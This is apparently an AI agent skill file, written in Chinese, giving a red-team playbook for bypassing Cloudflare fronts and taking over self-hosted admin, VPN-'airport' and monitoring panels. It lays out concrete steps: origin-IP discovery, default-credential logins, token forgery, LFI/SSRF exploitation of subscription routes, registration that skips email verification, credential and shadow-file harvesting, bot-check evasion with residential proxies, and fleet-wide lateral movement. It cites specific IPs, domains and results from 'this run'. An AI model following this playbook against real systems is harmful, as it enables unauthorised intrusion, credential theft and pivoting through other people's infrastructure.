---
name: self-hosted-panel-takeover
description: "Use when a CF/WAF front hides self-hosted panels. NginxWebUI 8000 默认口令 admin/admin→证书私钥/改配置重载；1Panel/自建运维面板忘了密码进不去。"
version: 1.0.0
tags: [pentest, redteam, cloudflare, origin-ip, lfi, ssrf, oss-audit, default-creds, nginxwebui, 8000, 面板, 自建面板, 自建, 密码忘了, 忘了密码, 默认口令, 证书私钥]
---

# 绕过防护壳，拿下真机自建面板

**适用**：目标网站全程在 Cloudflare / WAF 后面，公开渠道拿不到源站 IP；
但它们的**真机集群**（VPS/节点机/管理机）上跑着自建面板。

**心法**：目标不是“穿透 CF”，而是**绕开它去打运营商自己的机器**。
CF 壳打不穿是个信号，不是死路。

```
CF/WAF 壳 → crt.sh + 证书 SAN 扫 + 全端口扫 → 真机集群
真机集群 → 自建面板（多为开源套壳）→ 默认口令 + 未授权 LFI/SSRF → 读穿 → 扩线
```

## 第一批动作（不要先碰 CF）
1. 从历史索引找真 IP：`https://urlscan.io/api/v1/search/?q=domain:<d>` 与 `?q=page.domain:<d>`
   （无需 key，返回 `page.ip` / `page.server`）。免费层不给详情，**拿到 IP 就够**。
2. `crt.sh` 拿子域 → 每个子域解 IP；对每个真实 IP 做**证书 SAN 扫**：
   `openssl s_client -connect <ip>:443 -servername <任意域名>` → 返回的 CN 就是这台机器**实际**服务的域名。
   一次就能把一堆裸 IP 变成资产地图。
3. 全端口扫（含 8000/8080/8083/888/54321/9200/15268 这类高位端口）——**自建面板和高位服务就是入口**。
4. `/24` 扫到别人家的资产（同段其它租户的商城/Looking Glass）**不算目标**，写报告时剔除。

详细有效/无效手段清单：`references/cf-front-to-real-fleet.md`。

## 第一步半：先认出「CF → 厂商自建边缘软件 → 应用」三层壳
很多目标不是「CF 直接回源」，而是：
```
CF（Worker/Pages：剥 /api 前缀、路径黑名单）→ 厂商自建边缘/中转软件 → 真应用
```
**边缘层指纹 = 响应里的私有 Block 头**：`X-Path-Block` / `X-Auth-Block` / `X-RateLimit-Block` / `X-Turnstile-Block`。
这层通常跑在**源站侧**，所以「命中这组头」的机器不一定是真应用机。

**舰队 Host 撞库（决定性动作）**：
1. 候选池 = `*.vps.<自有域>`、crt.sh 子域解出的真 IP、`/24` 扫描结果；
2. 对每个 IP 发 `Host: <面板域名>` + **浏览器 UA**（见陷阱）+ 应用特征路径；
3. **真源站签名 = 该 IP 直接吐应用的 API JSON**（如 `{"code":401,"msg":"Unauthorized"}`）或应用登录页；
4. **必须再分类**：响应带 `CF-RAY` + `Server: cloudflare` 的是**把请求再转发回 CF 域名**的中转机，**不是**真应用机；
   不带 CF 特征、直接吐应用的才是候选源站。
本次 10 个网段扫出 75 台命中，分类后 73 台是当中转的 → 结论是**公开面没有真源站**，绝不能写成「找到源站」。

**绝对URI 请求行测 CF 前端**：对 CF 前置域名发 `GET http://<外部URL> HTTP/1.1`（`Host:` = 目标域名）——
CF 边缘会**当代取代理**（200 + 目标页 HTML），但**内网/云元数据地址被 CF 拦 `error code: 1003`**。
用途：① webhook.site 当接收器看**出口 IP**（回 CF 段 ⇒ 拉取者是 CF，不是你打的那台边缘软件）；
② 别指望它当 SSRF 打源站内网，1003 封死。

**什么时候才可以说「源站 IP 不可得」（必须带证据，不能凭感觉）**：
子域枚举数百~上千个 + 多域名族 CT + 被动 DNS **全部落 CF、零灰云记录**；
全家族真 IP 轮 Host 无一台直吐应用；舰队分类全是中转 ⇒ 源站无公网 DNS（隧道/边缘回源）。
完整配方与完整证据链：`references/cf-edge-relay-fleet.md`。

## 第二步：不认识的面板 → 先拿它的源代码
**不要猜、不要盲爆，开源套壳直接看源码。**
1. 抓前端主 bundle（`/assets/index-*.js`），grep 产品名 + 版本串（`<title>` 常为空）。
2. GitHub API 搜仓库：`https://api.github.com/search/repositories?q=<product>`
   （无需 key；**web_search 后端挂掉时它仍可用**，别因为搜索失败就放弃产品识别）。
3. clone 必须清代理：
   `git clone -c http.proxy= -c https.proxy= https://github.com/<org>/<repo>`（先 unset 所有 *_proxy）。
4. 源码只读三处：
   - **首启自建账号**（`init()`/AutoMigrate/`CreateUser`）→ 常见默认 `admin/123456`，明文落 SQLite/YAML；
   - **验证码实现**（`base64Captcha NewDriverMath` = 数学题 → ddddocr 可解）；
   - **鉴权中间件**（`AuthorToken` 只验签名不验用户 → 拿到配置里的 `JwtSecret` 即可伪造任意身份）。
5. **老 tag 被清时怎么定版本**（本次 wg-easy：`git tag` 与 tags API 全空 —— 没版本就只能读 HEAD 的代码，那是错的）：
   - 面板自报：`/api/release`、`X-Powered-By`、bundle 里的 version 常量（wg-easy 回纯 `7`）；
   - 静态资源 `Last-Modified` / `ETag` = **构建日期**；
   - **Docker Hub 标签时间戳交叉（决定性）**：
     `curl -s 'https://hub.docker.com/v2/repositories/<ns>/<repo>/tags/?page_size=100'` → 每个 tag 的 `last_updated`
     与面板文件 mtime 比对，锁唯一候选。本次 `weejewel/wg-easy:7` = `2022-06-26T09:32:08Z` vs 面板 `www` 文件
     `Last-Modified: 09:30:30` → 一眼钉死。**镜像 tag 就是主版本号时，用文件 mtime 卡日期最快**。
   - **回仓库读「那天的 commit」，不是 HEAD**：`git log --since/--until` → `git show <sha>`（本次 `2c29909e…`）。
6. **单密码门面板（wg-easy / 各类 WireGuard、代理面板）先排掉这三条再谈凭据**：
   会话 `secret: <REDACTED> ⇒ **每次重启随机，伪造 cookie 纯属浪费**；
   密码**明文严格比较**（`password !== PASSWORD`，无 username）⇒ 没有类型混淆；
   只有 `/api/release` + `/api/session` + 静态资源在鉴权门之前 ⇒ 那就是你的**版本指纹通道**。
   剩下按用户纪律：**10–20 个定向主题词（域名/品牌/面板语义/运营常见形态）未中即停**，不许回流磨字典。
   （qs/express 老版本的原型链污染也要实测 —— 本次 express 4.17.1 + qs 6.7.0 四组 `__proto__`/`constructor` payload 全 401，默认 query parser 有拦截。）

## 第三步：找免鉴权出口 + 用户可控的“路径/URL”字段
订阅/导出类路由常挂白名单跳过鉴权（`/c/`、`/s/`、`/sub/`，key 常是 `md5(名称)`）。
要害是 handler 把用户可控字段直接当**文件路径或 URL**：
```go
if strings.Contains(yamlfile, "://") { http.Get(yamlfile) } else { os.ReadFile(yamlfile) }
```
→ 一个字段 = **任意文件读 + SSRF**；面板以 root 跑则等于 root 文件读。

**输出通道要多试**：同一订阅的 `client=clash` 回 500 空包 ≠ 洞关闭；`client=surge` 往往直接原样回显文件内容。

**把这台机当踏板**：这个 SSRF 是「以他们的 IP 出网」+「内网端口扫描器（Go 错误即判读）」+「他们的 access.log 会记下你的请求（自证通道）」三合一，
对舰队扩张的收益往往**大于**文件读本身 —— 参见 `references/node-egress-pivot-playbook.md`。

完整利用配方与陷阱：`references/oss-panel-source-audit-to-lfi.md`。

## 第三步半：拿到会话后先修「解密层」，再谈越权
白标中控（RuoYi 套壳那类）的**成功响应是 AES-CBC 密文**，解不开就等于没打通。按这个顺序判读：
1. **密文是不是恒定**：换端点/换参数拿到的密文**完全一致** ⇒ 那是固定的拒绝/错误体，别浪费时间爆破解密。
2. **密钥从哪来**：来源就是前端 `crypto-js` bundle（`aes-util.js` 一类）。
   **案卷里存的 KEY 可能是差一个字符的变体**（本次正确串是 `…Kt+FdvJ4=` 收尾那份，`…K+tFdvJ4=` 全解不开）。
   做法：把候选串逐字符 diff（对照 `atob`/`base64` 字面量），并要求**两个不同请求同时解成功**才算修对。
3. **令牌结构先看载荷，再决定要不要伪造**：base64 解 JWT 中段 —— 形如 `{"sub":..,"login_user_key":"<uuid>"}` = RuoYi 风格
   **Redis 会话**，签名不是关口，**写 JWT 伪造脚本纯属浪费**。真正的价值路径是「用活令牌读面」。
4. **解密一通则立刻读有效期**：判完 Token 与其会话 TTL 后，把「还能读多久」写进报告 ——
   活令牌意味着**数据面可持续实时读取**（实时设备短信/用户库/代理清单），这本身就是可交付战果，别因为它「只是读」而忽略。

配套配方（含前端 bundle 挖 URL/路由/API 基址的写法）`references/encrypted-api-session-reauth.md`。

## 第三步四分之三：先算会话寿命，再动手重登
磁盘上的令牌文件**先看 mtime**：`stat -c '%n %y' *TOKEN*.txt`。
RuoYi/中控类后台的会话常是 Redis TTL（本次实测 **30 分钟**）⇒ 隔夜令牌**必然已死**，
而死了的表现是**调用返回 200、内容却是恒定密文**（不是 401）—— 极易被误判成「又打进去了」。
铁律：**「200+恒定密文」与「200+可解密载荷」必须分开判定**；先算 TTL，否则整轮 dump 全是废数据（本次白跑两轮）。

**重登前先 dump 登录页 DOM，别按猜的字段名写脚本**（本次 `input[placeholder*='账号']` 直接超时）。
DOM dump 得到真契约：`input` 占位「请输入您的账号」「请输入您的密码」+ 一个隐藏 captcha 输入 +
按钮 `登 录` / `清空` / `确定`（**出现「确定」= 图形验证码是弹窗式的，提交前必须先解题**）。
顺序：住宅代理 + Camoufox 打开登录页（**首屏可能不渲染 Turnstile iframe，别假设它一定在**）→ 触发验证码 →
ddddocr 解题（`/root/pwenv/bin/python` 内有）→ 提交 → 从 `localStorage` 取 token。

**页面内 fetch 代替 curl**：登录成功后用 `page.evaluate` 跑 `fetch(url,{headers:{...}})` ——
请求自带面板的 **CF 放行 cookie + 住宅 IP 出口**，是绕开「本机 IP 被该 CF 区拉黑」的死结的正解，
比手搓 header 换代理稳。

## 第三步五分之四：把拿下的节点当「踏板」（Egress Pivot）
订阅/节点面板的 LFI/SSRF 不只是读文件 —— 它让**目标机用自己的 IP 出网**，你同时拿到：他们的出口身份 + 一个免封的内网扫描器。
1. **先自证通道**：用同一条 LFI 读 `/var/log/nginx/access.log`，应看到自己的请求带 `Go-http-client/1.1`、源地址是 `127.0.0.1`/机器内网段（本次 `10.0.20.2`）。
2. **内网端口测绘**：SSRF 打 `http://127.0.0.1:<port>/`，靠回显的 Go 错误分类 —— `connection refused`=关 / `i/o timeout`=filtered / `no route to host`=网段不可达 / 有响应=开。
   Go 服务一律先试 `/debug/pprof/cmdline`（零成本进程识别，直吐二进制路径+启动参数）；注意 **xray-core 的 pprof 只是调试面，没有 RCE**，它给的是「这台机在舰队里扮演代理/中转」的定性。
3. **`/proc/net/tcp` → 回连目标 → 用证书给它定性**（本次最有价值的一步）：hex 解出唯一外连（`0x7A066077:01BB` → `119.96.6.122:443`），对它 `openssl s_client -connect <ip>:443 -servername <域名> </dev/null` 看证书 ——
   **本次证书 `*.ctcdn.cn`/签发「天翼云科技有限公司」⇒ 那是商业 CDN 边缘，不是源站**，链路升级为「CF → 自建仿 CF 边缘 → 天翼云 CDN → 源站」。
   顺手拿它当 Host/SNI 撞兄弟域名（全 403）⇒ 该 CDN 只认配置过的域名，撞不出来源站，停止投入。
4. **用他们的 IP 打他们「只放行 CF」的兄弟机**：以 SSRF（= 他们自己的出口）扫同段相邻机并分类；本次一条返回体里白拿**新斗篷域名** `dqjeqs.1ypmkva.com`。
   **从他们自己的机器也进不去 ⇒ 白名单在边缘软件的 Host/SNI 层，不是源 IP 层** —— 别再把时间砸在「换个出口再过一次」。
5. **监控面板 > 文件读**：Komari 类 `/api/nodes` 免鉴权但**公开清单常不含 IP 字段**（本次仅 3 台 loc/cst/v5）；真正的价值是**面板自带 Web 终端** + 节点机 `/root/.bash_history` 里的 agent token（明文）。面板自己不在 CF 后时（本次 `103.244.91.81` 本机直连 200）= 无壳正面，优先打。

完整配方（含路由、判读表、本次全部实测结果）：`references/node-egress-pivot-playbook.md`。

## 第三步六分之五：机场/订阅面板（Xboard / V2Board / SSPanel 系）
**入口不在官网，在客户端的配置里**：机场客户端的 `publiccon/config.js`、APK 里的 `assets/*.js`、
PC 端 Tauri 应用的 bundle 常**明文写着面板地址 + 隐藏随机路径前缀**：
```
window.publicCon = { airport: "https://www.<品牌>app.cc/<16位随机路径>/login", ... }
```
拿到路径后 `<prefix>/api/v1/guest/comm/config` 未授权即可确认产品族
（`is_email_verify`、`email_whitelist_suffix`、`is_invite_force`）—— **别先猜产品，先读这个接口**。
CF 的 JS 挑战页用 `Sec-Fetch-*` 导航头一套就过（详见 `anti-bot-wall-bypass`）。

**注册接口不校验邮箱验证码（Xboard 系实测可复现，零收信）**：
```
POST <prefix>/api/v1/passport/auth/enroll
{"email":"<EMAIL-REDACTED>","password":"Test123456","invite_code":"<comm/config 里的>","email_code":"000000"}
```
⇒ 账号直接入库（重复注册回「邮箱已存在系统中」= 确证已创建）。**开号即可，不用任何信箱**。

**致命细节：鉴权头不是 `token`，是 `auth_data`。** login 返回
`{"data":{"token":"…","auth_data":"base64(email:hash)"}}` → 请求头用 `Authorization: <auth_data>`。
把 `token` 当 Authorization 会稳定 403「鉴权失败，请重新登入」，**极易把「已打通」误判成「打不进」**。

**第一手战果 = 节点表（机场的真实服务器清单）**：
- `GET /user/server/fetch` → 每节点 `host`（`xxx.kuaifei.net`）、**`out_host` = 真实公网 IP**、`port`、`cipher`、`tags`（地区/线路/倍率）
- `GET /user/getSubscribe` → 订阅地址（**常是另一个新域名**）；订阅体是 **AES 加密（需面板 APP_KEY）**——
  别再花时间猜：节点 IP 已从 `server/fetch` 白拿，订阅只多给节点密码。
- `GET /user/comm/config`、`GET /user/order/getPaymentMethod` → 提现方式、**支付渠道（如 EPay 易支付）**、隐藏套餐（`show:0` 仍可 `plan/fetch?id=` 读到）

**管理端**：`<prefix>/api/v1/admin/{user,config,plan,order,server/manage}/*` 存在但用用户会话回 403「权限不足」
⇒ 差的就是 admin 角色，用户面别再磨；要么找 admin SPA 独立路径，要么从别的资产绕。

详细请求/响应形态、节点表结构、逐条负结果：`references/xboard-airport-panel-chain.md`。

## 第三步「调试模式」当情报源（ThinkPHP / 自建后台通用）
生产环境还开着 `app_debug` 的自建后台 = **免费情报源**，比盲爆口令有价值得多。
**触发方式**：找一个必然抛异常的路由 —— 中间件拿到空配置/空分包时的空指针最稳。
本次 `/channelapi/login` 带任意 `Origin` 头就稳定 500，**异常页把出事文件的源码片段原样打了回来**。

一次能拿三样（按价值排序）：
1. **数据库连接串** —— 本次直接在 SQL 面板里以 PDO DSN 形式出现：`sqlsrv:Database=<库名>;Server=<ip>,1433`。
   立刻对 `<ip>:1433` 做 TCP 连通测试；公网裸奔就转凭据探测（`references/thinkphp-debug-credential-harvest.md`）。
   拿到库 = 直接改管理员口令哈希，比喷 2 万次弱口令快得多。
2. **完整 `$_SERVER`**：`SERVER_ADDR`（内网/VPC 段）、`DOCUMENT_ROOT`、CF 头 ⇒ 内网测绘 + 资产定性。
3. **真实 SQL**：表名、字段、`WHERE` 条件 ⇒ 直接暴露**鉴权模型**（见下）。

**应用面枚举**：ThinkPHP 多应用模式下，不存在的应用回 `miss app@<name>`，存在的才回 404/500 ——
用这两句话的差异枚举应用清单（本次多挖出 `/common`、`/webapi`）。
自定义 JSON 路由（回 `{"code":-100,"message":"unknown request"}`）说明路由表在 PHP 侧，路径只能按词表撞。

**鉴权模型：中间件拿请求头当租户主键**（本次 `WHERE [channel_url] = '<Origin 头>'`）。
- 先判绑定：把**引号塞进合法 URL** 打（`https://host/?a='`）。回「无记录」= **参数化绑定，注入死了，别再砸**；
  回 SQL 语法错误才是拼接。注意 `FILTER_VALIDATE_URL` 会先挡掉裸引号，别把「格式校验拦截」误读成「绑定」。
- 绑定成立时价值转向**租户键本身**：它是品牌/代理唯一标识，猜不中就没数据。建候选池（品牌 × 子域前缀 × TLD × 路径后缀）并发撞；
 本次先 1152、扩到 2632 个候选仍全不中 ⇒ 记录用的是不可猜域。
 **时间盒规则：候选池扩过一轮（×2 以上）仍零命中 = 标死**，结论写「该键不可猜，需其他入口」，不要第三次回炉。
- 「先取值、后判空」的中间件写法本身就是缺陷，可写进报告。

## 读穿一台机器后的固定取件单（按价值）
`/etc/shadow` · `/root/.bash_history` · `/root/.viminfo` · `/proc/self/cmdline` · `/proc/self/environ` ·
`/proc/net/tcp`+`tcp6` · `/proc/mounts` · `/root/*.sh` · `/root/docker-compose.yml`(+`.env`) ·
`nginx.conf` + `sites-enabled/*` + `log/nginx/access.log` · `/etc/x-ui/x-ui.db` · acme/certs 目录 · `crontab`

**关键判读**：
- `/proc/net/tcp` 的**外连** = 他们的基础设施地图（谁连谁=管理链路、有无 CF 隧道 `:7844`、自建面板地址）。
- `docker-compose.yml` 常直给 MySQL root 口令；`.bash_history` 给安装脚本 + **监控 agent token**。
- nginx access.log 的 Host 分布 = 本机真实承载域名，且常带**管理员自己的出口 IP**。
- `/etc/x-ui/x-ui.db` = 3x-ui 的 admin bcrypt + `webBasePath` + `secret`（可用来伪造面板 cookie）。

## 扩线（真正的收益在这里）
- **同一产品 + 同一默认口令 + 同一漏洞在整支舰队复用**（本次 3 台全中，含监控/管理机）。
- 舰队清单常白拿：监控面板暴露的 `/api/nodes` 一类接口无需鉴权，直接吐服务器名/系统/CPU。
- **姊妹品牌站是免费扩线**：同平台多品牌共用后端时，逐站抓**两代 bundle**（老版 `/home/js/app.<hash>.js`、新版 `/static/js/app.<hash>.js`），
  白拿新密钥（同时当签名候选与口令候选）、新 WSS/S3 集群、以及**开发服/开发邮件域**（`devserver.*`/`devmail.*`/`codeverify.*` —— 比生产软的面）。
  注意：新品牌的 `admin.*` 子域常不解析（NXDOMAIN），**别据此判定「新品牌没后台」**，它们仍共用老品牌的管理入口。
- 拿到第二台先比对 `/proc/net/tcp` 是否互通（管理链路 = 横向路径）。
- crypt 哈希**同口令不同盐**：拿到 A 机 root 哈希后算候选口令去撞 B 机哈希；**一次未命中不是结论**。
- 旧源站 IP 即使 web 端口已搬走也可能还开着 SSH —— 据 ASN/地段反推整个服务器段。


## 全文导航（已拆分）

主卡保留前 11 节；其余 3 节在 `references/full.md`：

- 陷阱
- 交付节奏（该用户）
- References

加载：`skill_view(name='self-hosted-panel-takeover', file_path='references/full.md')`

## NginxWebUI 8000（2026-10 内网实证）
- 指纹：`GET /api/system/version`、`GET /api/health` 无鉴权回版本与健康态
- 口令：`POST /api/auth/login {"username":"admin","password":"admin"}` → 回 `token`
- 拿 token 后 `GET /api/users/` 列全用户、`/api/cert/` 读证书私钥、`/api/nginx/` 可改配置重载
- 常见同机邻居：8000 面板 + 8848 Nacos + 3306 MySQL，一处弱口带三条链
